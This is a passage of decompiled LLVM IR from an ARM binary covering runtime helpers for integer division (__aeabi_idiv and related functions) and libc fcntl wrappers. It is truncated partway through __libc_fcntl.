  uselistorder i32 %v1_11f60, { 1, 0, 2, 3 }
  uselistorder i32 %v2_11f58, { 1, 0 }
  uselistorder i32 %v4_11f54, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11f54, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11f44, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_11f1c, { 1, 0 }
  uselistorder i32 %v0_11f2c, { 1, 0, 2 }
  uselistorder i32 %v4_11f10, { 1, 0 }
  uselistorder i32 %v1_11f18, { 1, 2, 0 }
  uselistorder i32 %v4_11f04, { 1, 0 }
  uselistorder i32 %v1_11f0c, { 1, 2, 0 }
  uselistorder i32 %v4_11ef8, { 1, 0 }
  uselistorder i32 %v1_11f00, { 1, 2, 0 }
  uselistorder i32 %v1_11f24, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_11ef4, { 1, 0 }
  uselistorder i32 %v1_11f20, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_11ee0, { 1, 0 }
  uselistorder i32 %v3_11edc, { 1, 0 }
  uselistorder i32 %v1_11edc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_11ee0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_11ecc, { 1, 0 }
  uselistorder i32 %v4_11ec8, { 2, 1, 0 }
  uselistorder i32 %v1_11ecc, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_11ed4.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_11ea0, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_11ea0, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_11e94, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_11f2c, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_11ee8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ed4thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_11f94 = udiv i32 %arg1, %arg2
  ret i32 %v2_11f94
}

define i32 @__aeabi_idiv(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_11fa8 = load i32, i32* @r1, align 4
  %v1_11fa8 = icmp slt i32 %v0_11fa8, 0
  %v2_11fa8 = icmp eq i32 %v0_11fa8, 0
  %v2_11fac = xor i32 %v0_11fa8, %arg1
  br i1 %v2_11fa8, label %dec_label_pc_120c0, label %dec_label_pc_11fb4

dec_label_pc_11fb4:                               ; preds = %entry
  br i1 %v1_11fa8, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_11fb4
  %v2_11fb4 = sub i32 0, %v0_11fa8
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_11fb4, %bb
  %v1_12080 = phi i32 [ %v2_11fb4, %bb ], [ %v0_11fa8, %dec_label_pc_11fb4 ]
  %v1_11fb8 = add i32 %v1_12080, -1
  %v7_11fb8 = icmp eq i32 %v1_12080, 1
  br i1 %v7_11fb8, label %dec_label_pc_12060, label %dec_label_pc_11fc0

dec_label_pc_11fc0:                               ; preds = %thread-pre-split
  %v1_11fc0 = icmp slt i32 %arg1, 0
  br i1 %v1_11fc0, label %bb85, label %bb86

bb85:                                             ; preds = %dec_label_pc_11fc0
  %v2_11fc4 = sub i32 0, %arg1
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_11fc0, %bb85
  %v0_120b4 = phi i32 [ %arg1, %dec_label_pc_11fc0 ], [ %v2_11fc4, %bb85 ]
  %v3_11fc8 = icmp uge i32 %v0_120b4, %v1_12080
  %v9_11fc8 = icmp eq i32 %v0_120b4, %v1_12080
  %v2_11fcc = xor i1 %v3_11fc8, true
  %v3_11fcc = or i1 %v9_11fc8, %v2_11fcc
  br i1 %v3_11fcc, label %dec_label_pc_1206c, label %dec_label_pc_11fd0

dec_label_pc_11fd0:                               ; preds = %bb86
  %v2_11fd0 = and i32 %v1_11fb8, %v1_12080
  %v4_11fd0 = icmp eq i32 %v2_11fd0, 0
  br i1 %v4_11fd0, label %dec_label_pc_1207c, label %dec_label_pc_11fd8

dec_label_pc_11fd8:                               ; preds = %dec_label_pc_11fd0
  %v3_11fd8 = icmp ult i32 %v1_12080, 536870912
  br i1 %v3_11fd8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_11fd8
  %v4_11fdc = mul i32 %v1_12080, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_11fd8, %.thread
  %v0_11ffc.pr40.ph = phi i32 [ %v4_11fdc, %.thread ], [ %v1_12080, %dec_label_pc_11fd8 ]
  %storemerge143 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_11fd8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb89
  %v0_11ffc.pr40 = phi i32 [ %v4_11ff0, %bb89 ], [ %v0_11ffc.pr40.ph, %.preheader.preheader ]
  %v1_11ff4 = phi i32 [ %v4_11ff4, %bb89 ], [ %storemerge143, %.preheader.preheader ]
  %v2_11fe8 = icmp ugt i32 %v0_11ffc.pr40, 268435455
  br i1 %v2_11fe8, label %.thread3, label %bb87

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_11ffcthread-pre-split.loopexit

bb87:                                             ; preds = %.preheader
  %v4_11fec = icmp ult i32 %v0_11ffc.pr40, %v0_120b4
  br i1 %v4_11fec, label %bb88, label %dec_label_pc_11ffcthread-pre-split.loopexit.loopexit

bb88:                                             ; preds = %bb87
  %v2_11ff0 = and i32 %v0_11ffc.pr40, 268435456
  %v3_11ff0 = icmp eq i32 %v2_11ff0, 0
  %v4_11ff0 = mul i32 %v0_11ffc.pr40, 16
  br i1 %v3_11ff0, label %bb89, label %dec_label_pc_11ffc.loopexit

bb89:                                             ; preds = %bb88
  %v2_11ff4 = and i32 %v1_11ff4, 268435456
  %v3_11ff4 = icmp eq i32 %v2_11ff4, 0
  %v4_11ff4 = mul i32 %v1_11ff4, 16
  br i1 %v3_11ff4, label %.preheader, label %dec_label_pc_11ffcthread-pre-split.loopexit.loopexit

dec_label_pc_11ffcthread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1200852.ph = phi i32 [ %v1_11ff4, %bb87 ], [ %v4_11ff4, %bb89 ]
  %v0_11ffc.pr42.ph = phi i32 [ %v0_11ffc.pr40, %bb87 ], [ %v4_11ff0, %bb89 ]
  br label %dec_label_pc_11ffcthread-pre-split.loopexit

dec_label_pc_11ffcthread-pre-split.loopexit:      ; preds = %dec_label_pc_11ffcthread-pre-split.loopexit.loopexit, %.thread3
  %v1_1200852 = phi i32 [ %v1_11ff4, %.thread3 ], [ %v1_1200852.ph, %dec_label_pc_11ffcthread-pre-split.loopexit.loopexit ]
  %v0_11ffc.pr42 = phi i32 [ %v0_11ffc.pr40, %.thread3 ], [ %v0_11ffc.pr42.ph, %dec_label_pc_11ffcthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_11ffcthread-pre-split

dec_label_pc_11ffcthread-pre-split:               ; preds = %dec_label_pc_11ffcthread-pre-split.loopexit, %bb91
  %v1_1200850 = phi i32 [ %v1_1200852, %dec_label_pc_11ffcthread-pre-split.loopexit ], [ %v3_12008, %bb91 ]
  %v2_1200048 = phi i32 [ %v0_120b4, %dec_label_pc_11ffcthread-pre-split.loopexit ], [ %v2_12000, %bb91 ]
  %v0_11ffc.pr = phi i32 [ %v0_11ffc.pr42, %dec_label_pc_11ffcthread-pre-split.loopexit ], [ %v3_12004, %bb91 ]
  br label %dec_label_pc_11ffc

dec_label_pc_11ffc.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_11ffc

dec_label_pc_11ffc:                               ; preds = %dec_label_pc_11ffc.loopexit, %dec_label_pc_11ffcthread-pre-split
  %v1_12008 = phi i32 [ %v1_1200850, %dec_label_pc_11ffcthread-pre-split ], [ %v1_11ff4, %dec_label_pc_11ffc.loopexit ]
  %v2_12000 = phi i32 [ %v2_1200048, %dec_label_pc_11ffcthread-pre-split ], [ %v0_120b4, %dec_label_pc_11ffc.loopexit ]
  %v1_12004 = phi i32 [ %v0_11ffc.pr, %dec_label_pc_11ffcthread-pre-split ], [ %v4_11ff0, %dec_label_pc_11ffc.loopexit ]
  %v2_11ffc = icmp slt i32 %v1_12004, 0
  br i1 %v2_11ffc, label %dec_label_pc_12010, label %bb90

bb90:                                             ; preds = %dec_label_pc_11ffc
  %v4_12000 = icmp ult i32 %v1_12004, %v2_12000
  br i1 %v4_12000, label %bb91, label %dec_label_pc_12010

bb91:                                             ; preds = %bb90
  %v3_12004 = mul i32 %v1_12004, 2
  %v2_12008 = icmp slt i32 %v1_12008, 0
  %v3_12008 = mul i32 %v1_12008, 2
  br i1 %v2_12008, label %dec_label_pc_12010, label %dec_label_pc_11ffcthread-pre-split

dec_label_pc_12010:                               ; preds = %bb90, %dec_label_pc_11ffc, %bb91
  %v2_1201c63 = phi i32 [ %v3_12008, %bb91 ], [ %v1_12008, %bb90 ], [ %v1_12008, %dec_label_pc_11ffc ]
  %v1_1201455 = phi i32 [ %v3_12004, %bb91 ], [ %v1_12004, %bb90 ], [ %v1_12004, %dec_label_pc_11ffc ]
  br label %dec_label_pc_12014

dec_label_pc_12014:                               ; preds = %.thread13, %dec_label_pc_12010
  %v1_12048 = phi i32 [ %v4_12048, %.thread13 ], [ %v2_1201c63, %dec_label_pc_12010 ]
  %v1_1201c = phi i32 [ %v1_12058, %.thread13 ], [ 0, %dec_label_pc_12010 ]
  %v1_1204c = phi i32 [ %v4_1204c, %.thread13 ], [ %v1_1201455, %dec_label_pc_12010 ]
  %v1_12018 = phi i32 [ %v0_12044, %.thread13 ], [ %v0_120b4, %dec_label_pc_12010 ]
  %v3_12014 = icmp ult i32 %v1_12018, %v1_1204c
  br i1 %v3_12014, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_12014
  %v3_12018 = sub i32 %v1_12018, %v1_1204c
  %v3_1201c = or i32 %v1_1201c, %v1_12048
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_12014, %bb92
  %v1_12024 = phi i32 [ %v1_12018, %dec_label_pc_12014 ], [ %v3_12018, %bb92 ]
  %v1_12028 = phi i32 [ %v1_1201c, %dec_label_pc_12014 ], [ %v3_1201c, %bb92 ]
  %v4_12020 = udiv i32 %v1_1204c, 2
  %v6_12020 = icmp ult i32 %v1_12024, %v4_12020
  br i1 %v6_12020, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_12024 = urem i32 %v1_1204c, 2
  %v4_12024 = icmp eq i32 %v3_12024, 0
  %v6_12024 = sub i32 %v1_12024, %v4_12020
  br i1 %v4_12024, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_12028 = udiv i32 %v1_12048, 2
  %v6_12028 = or i32 %v1_12028, %v5_12028
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_12030 = phi i32 [ %v6_12024, %bb93 ], [ %v1_12024, %.thread8 ], [ %v6_12024, %bb94 ]
  %v1_12034 = phi i32 [ %v1_12028, %bb93 ], [ %v1_12028, %.thread8 ], [ %v6_12028, %bb94 ]
  %v4_1202c = udiv i32 %v1_1204c, 4
  %v6_1202c = icmp ult i32 %v1_12030, %v4_1202c
  br i1 %v6_1202c, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_12030 = and i32 %v1_1204c, 2
  %v4_12030 = icmp eq i32 %v3_12030, 0
  %v6_12030 = sub i32 %v1_12030, %v4_1202c
  br i1 %v4_12030, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_12034 = udiv i32 %v1_12048, 4
  %v6_12034 = or i32 %v1_12034, %v5_12034
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1203c = phi i32 [ %v6_12030, %bb95 ], [ %v1_12030, %.thread9 ], [ %v6_12030, %bb96 ]
  %v1_12040 = phi i32 [ %v1_12034, %bb95 ], [ %v1_12034, %.thread9 ], [ %v6_12034, %bb96 ]
  %v4_12038 = udiv i32 %v1_1204c, 8
  %v6_12038 = icmp ult i32 %v1_1203c, %v4_12038
  br i1 %v6_12038, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1203c = and i32 %v1_1204c, 4
  %v4_1203c = icmp eq i32 %v3_1203c, 0
  %v6_1203c = sub i32 %v1_1203c, %v4_12038
  br i1 %v4_1203c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_12040 = udiv i32 %v1_12048, 8
  %v6_12040 = or i32 %v1_12040, %v5_12040
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_12058 = phi i32 [ %v1_12040, %bb97 ], [ %v1_12040, %.thread10 ], [ %v6_12040, %bb98 ]
  %v0_12044 = phi i32 [ %v6_1203c, %bb97 ], [ %v1_1203c, %.thread10 ], [ %v6_1203c, %bb98 ]
  %v2_12044 = icmp eq i32 %v0_12044, 0
  br i1 %v2_12044, label %dec_label_pc_12054, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_12048, 16
  br i1 %tmp, label %dec_label_pc_12054, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_12048 = udiv i32 %v1_12048, 16
  %v4_1204c = udiv i32 %v1_1204c, 16
  br label %dec_label_pc_12014

dec_label_pc_12054:                               ; preds = %thread-pre-split12, %bb99
  %v1_12054 = icmp slt i32 %v2_11fac, 0
  br i1 %v1_12054, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_12054
  %v2_12058 = sub i32 0, %v1_12058
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_12060, %dec_label_pc_12054, %bb100
  %v1_1205c = phi i32 [ %v1_12058, %dec_label_pc_12054 ], [ %v2_12058, %bb100 ], [ %arg1, %dec_label_pc_12060 ], [ %v2_12064, %bb101 ], [ %v1_1207880, %bb103 ], [ %v2_12074, %bb104 ]
  ret i32 %v1_1205c

dec_label_pc_12060:                               ; preds = %thread-pre-split
  br i1 %v1_11fa8, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_12060
  %v2_12064 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_1206c:                               ; preds = %bb86
  br i1 %v3_11fc8, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1206c
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1206c, %bb102
  %v1_1207880 = phi i32 [ %arg1, %dec_label_pc_1206c ], [ 0, %bb102 ]
  br i1 %v9_11fc8, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_12070 = ashr i32 %v2_11fac, 31
  %v2_12074 = or i32 %v4_12070, 1
  br label %.thread16

dec_label_pc_1207c:                               ; preds = %dec_label_pc_11fd0
  %v2_1207c = icmp ugt i32 %v1_12080, 65535
  br i1 %v2_1207c, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1207c
  %v2_12080 = and i32 %v1_12080, 32768
  %v3_12080 = icmp eq i32 %v2_12080, 0
  %v4_12080 = udiv i32 %v1_12080, 65536
  br i1 %v3_12080, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1207c
  %v0_1208c70 = phi i32 [ %v1_12080, %dec_label_pc_1207c ], [ %v4_12080, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_12090 = phi i32 [ %v0_1208c70, %.thread19 ], [ %v4_12080, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1208c = icmp ugt i32 %v1_12090, 255
  br i1 %v2_1208c, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_12090 = and i32 %v1_12090, 128
  %v3_12090 = icmp eq i32 %v2_12090, 0
  %v4_12090 = udiv i32 %v1_12090, 256
  br i1 %v3_12090, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_12094 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_120a0 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_12094, %bb108 ]
  %v1_1209c = phi i32 [ %v1_12090, %bb106 ], [ %v4_12090, %bb107 ], [ %v4_12090, %bb108 ]
  %v2_12098 = icmp ugt i32 %v1_1209c, 15
  br i1 %v2_12098, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1209c = and i32 %v1_1209c, 8
  %v3_1209c = icmp eq i32 %v2_1209c, 0
  %v4_1209c = udiv i32 %v1_1209c, 16
  br i1 %v3_1209c, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_120a0 = add nsw i32 %v1_120a0, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_120a8 = phi i32 [ %v1_120a0, %.thread20 ], [ %v1_120a0, %bb109 ], [ %v2_120a0, %bb110 ]
  %v5_120ac = phi i32 [ %v1_1209c, %.thread20 ], [ %v4_1209c, %bb109 ], [ %v4_1209c, %bb110 ]
  %v2_120a4 = icmp ugt i32 %v5_120ac, 3
  %v7_120a4 = icmp eq i32 %v5_120ac, 4
  %v2_120a8 = xor i1 %v7_120a4, true
  %v3_120a8 = and i1 %v2_120a4, %v2_120a8
  br i1 %v3_120a8, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_120a8 = add nsw i32 %v4_120a8, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_120ac = phi i32 [ %v4_120a8, %.thread21 ], [ %v5_120a8, %bb111 ]
  %v2_120ac = xor i1 %v2_120a4, true
  %v3_120ac = or i1 %v7_120a4, %v2_120ac
  br i1 %v3_120ac, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_120ac = udiv i32 %v5_120ac, 2
  %v9_120ac = add i32 %v4_120ac, %v8_120ac
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_120b4 = phi i32 [ %v4_120ac, %bb112 ], [ %v9_120ac, %bb113 ]
  %v1_120b0 = icmp slt i32 %v2_11fac, 0
  %v6_120b4 = lshr i32 %v0_120b4, %v1_120b4
  %v2_120b8 = sub i32 0, %v6_120b4
  %v2_120b8.v6_120b4 = select i1 %v1_120b0, i32 %v2_120b8, i32 %v6_120b4
  ret i32 %v2_120b8.v6_120b4

dec_label_pc_120c0:                               ; preds = %entry
  %v0_120c4 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_120ac, { 1, 0 }
  uselistorder i1 %v7_120a4, { 1, 0 }
  uselistorder i32 %v4_1209c, { 1, 0 }
  uselistorder i32 %v1_1209c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12090, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_12090, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12080, { 1, 0 }
  uselistorder i32 %v0_12044, { 1, 0 }
  uselistorder i32 %v4_12038, { 1, 0 }
  uselistorder i32 %v1_12040, { 1, 2, 0 }
  uselistorder i32 %v4_1202c, { 1, 0 }
  uselistorder i32 %v1_12034, { 1, 2, 0 }
  uselistorder i32 %v4_12020, { 1, 0 }
  uselistorder i32 %v1_12028, { 1, 2, 0 }
  uselistorder i32 %v1_1204c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1201c, { 1, 0 }
  uselistorder i32 %v1_12048, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_12008, { 1, 0 }
  uselistorder i32 %v3_12004, { 1, 0 }
  uselistorder i32 %v1_12004, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_12000, { 1, 0 }
  uselistorder i32 %v1_12008, { 1, 2, 0, 3 }
  uselistorder i32 %v4_11ff4, { 1, 0 }
  uselistorder i32 %v4_11ff0, { 2, 1, 0 }
  uselistorder i32 %v1_11ff4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_11ffc.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_11fc8, { 1, 0 }
  uselistorder i32 %v1_12080, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_11fac, { 1, 0, 2 }
  uselistorder i32 %v0_11fa8, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 65535, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_12054, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_12010, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ffcthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_120d8 = sdiv i32 %arg1, %arg2
  ret i32 %v2_120d8
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_120f4 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_120f4
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_12110 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_12110, 2
  br i1 %tmp, label %dec_label_pc_1214c, label %dec_label_pc_12128

dec_label_pc_12128:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_12180, label %dec_label_pc_1213c

dec_label_pc_1213c:                               ; preds = %dec_label_pc_12128
  %v0_12140 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_12174

dec_label_pc_1214c:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_12168, label %dec_label_pc_12180

dec_label_pc_12168:                               ; preds = %dec_label_pc_1214c
  %v0_1216c = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_12174

dec_label_pc_12174:                               ; preds = %dec_label_pc_1213c, %dec_label_pc_12168
  %storemerge2 = phi i32 [ %v0_12140, %dec_label_pc_1213c ], [ %v0_1216c, %dec_label_pc_12168 ]
  %storemerge.in = load i16, i16* @global_var_233d0.483, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_12174 = load i32, i32* %r2.global-to-local, align 4
  %v1_12174 = sub i32 0, %v0_12174
  store i32 %v1_12174, i32* %r2.global-to-local, align 4
  %v3_12178 = add i32 %storemerge, %storemerge2
  %v4_12178 = inttoptr i32 %v3_12178 to i32*
  store i32 %v1_12174, i32* %v4_12178, align 4
  br label %dec_label_pc_12180

dec_label_pc_12180:                               ; preds = %dec_label_pc_12128, %dec_label_pc_1214c, %dec_label_pc_12174
  %storemerge1 = phi i32 [ -1, %dec_label_pc_12174 ], [ %arg1, %dec_label_pc_1214c ], [ %arg1, %dec_label_pc_12128 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_12180, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12174, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_12198 = load i32, i32* @r2, align 4
  %v9_12198 = load i32, i32* @r3, align 4
  store i32 %v9_12198, i32* %stack_var_-4, align 4
  %v3_1219c = load i32, i32* @r4, align 4
  store i32 %v3_1219c, i32* %stack_var_-32, align 4
  %v6_1219c = load i32, i32* @r5, align 4
  %v12_1219c = load i32, i32* @r7, align 4
  %v4_121ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 13032) to i32*), align 4
  %v2_121b4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_121b4, i32* @r3, align 4
  %v2_121b8 = icmp eq i32 %v4_121ac, 0
  %v0_121c0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_121c0, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_12198, i32* @r4, align 4
  br i1 %v2_121b8, label %dec_label_pc_121dc, label %dec_label_pc_121d0

dec_label_pc_121d0:                               ; preds = %entry
  %v7_121d0 = icmp eq i32 %arg2, 7
  br i1 %v7_121d0, label %dec_label_pc_1221c, label %bb

bb:                                               ; preds = %dec_label_pc_121d0
  %v8_121d4 = icmp eq i32 %arg2, 14
  br i1 %v8_121d4, label %dec_label_pc_1221c, label %dec_label_pc_121dc

dec_label_pc_121dc:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_121c0, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_121c0, -4095
  br i1 %tmp, label %dec_label_pc_12214, label %dec_label_pc_121fc

dec_label_pc_121fc:                               ; preds = %dec_label_pc_121dc
  %v0_12200 = call i32 @__aeabi_read_tp()
  %v3_12204 = load i16, i16* @global_var_233d0.483, align 2
  %v4_12204 = sext i16 %v3_12204 to i32
  store i32 %v4_12204, i32* @r3, align 4
  %v0_12208 = load i32, i32* @r2, align 4
  %v1_12208 = sub i32 0, %v0_12208
  store i32 %v1_12208, i32* @r2, align 4
  %v3_1220c = add i32 %v4_12204, %v0_12200
  %v4_1220c = inttoptr i32 %v3_1220c to i32*
  store i32 %v1_12208, i32* %v4_1220c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12214

dec_label_pc_12214:                               ; preds = %dec_label_pc_121dc, %dec_label_pc_121fc
  %v0_12214 = phi i32 [ %v0_121c0, %dec_label_pc_121dc ], [ -1, %dec_label_pc_121fc ]
  br label %dec_label_pc_12268

dec_label_pc_1221c:                               ; preds = %dec_label_pc_121d0, %bb
  %v0_1221c = call i32 @__libc_enable_asynccancel()
  %v0_12220 = load i32, i32* @r7, align 4
  store i32 %v0_12220, i32* @r1, align 4
  store i32 %v0_1221c, i32* %r6.global-to-local, align 4
  %v0_1222c = load i32, i32* @r5, align 4
  store i32 %v0_1222c, i32* %r0.global-to-local, align 4
  store i32 %v0_1222c, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_1222c, -4095
  br i1 %tmp15, label %dec_label_pc_1225c, label %dec_label_pc_12244

dec_label_pc_12244:                               ; preds = %dec_label_pc_1221c
  %v1_12248 = sub i32 0, %v0_1222c
  %v0_1224c = call i32 @__aeabi_read_tp()
  store i32 %v0_1224c, i32* %r0.global-to-local, align 4
  %v3_12250 = load i16, i16* @global_var_233d0.483, align 2
  %v4_12250 = sext i16 %v3_12250 to i32
  store i32 %v4_12250, i32* @r3, align 4
  %v3_12254 = add i32 %v4_12250, %v0_1224c
  %v4_12254 = inttoptr i32 %v3_12254 to i32*
  store i32 %v1_12248, i32* %v4_12254, align 4
  store i32 -1, i32* @r2, align 4
  %v0_1225c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1225c

dec_label_pc_1225c:                               ; preds = %dec_label_pc_1221c, %dec_label_pc_12244
  %v0_12260 = phi i32 [ %v0_1222c, %dec_label_pc_1221c ], [ -1, %dec_label_pc_12244 ]
  %v0_1225c = phi i32 [ %v0_1221c, %dec_label_pc_1221c ], [ %v0_1225c.pre, %dec_label_pc_12244 ]
  store i32 %v0_1225c, i32* %r0.global-to-local, align 4
  store i32 %v0_12260, i32* @r7, align 4
  %v1_12264 = call i32 @__libc_disable_asynccancel(i32 %v0_1225c)
  store i32 %v1_12264, i32* %r0.global-to-local, align 4
